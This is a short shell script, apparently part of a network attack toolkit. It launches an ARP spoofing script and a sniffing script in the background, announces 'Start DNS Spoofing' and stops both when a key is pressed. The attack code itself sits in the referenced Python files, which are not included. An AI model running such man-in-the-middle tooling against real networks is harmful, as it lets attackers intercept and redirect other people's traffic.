python3 arpspoof.py &
arp=$!
sleep 3
python3 sniff.py &
dns=$!
echo "Start DNS Spoofing"
echo "Type any letter to exit"
read e
kill $arp
kill $dns
